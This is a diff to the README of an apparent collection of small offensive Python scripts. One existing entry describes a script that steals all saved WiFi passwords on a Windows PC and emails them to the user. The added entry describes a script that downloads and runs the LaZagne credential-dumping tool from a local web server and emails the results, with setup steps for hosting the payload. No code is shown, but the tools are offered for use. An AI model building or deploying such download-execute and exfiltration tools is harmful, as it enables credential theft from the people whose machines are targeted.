@@ -77,3 +77,7 @@ Small programs that executes diffrent code snippets. used to test malware-ish pa
 Steal all wifi information (including passwords) on windows PC and sends it to a given email. Change the send_mail("","",results)
 with your email(currently set to work with gmail) + password.
 
+### download_execute_and_report
+Downloads a file, exetues it and sends the data to your email.
+Currently downloads & executes https://github.com/AlessandroZ/LaZagne/releases from a local webserver.
+You can start your own webserver in linux with service apache2 start. Files can be added here: /var/www/html/
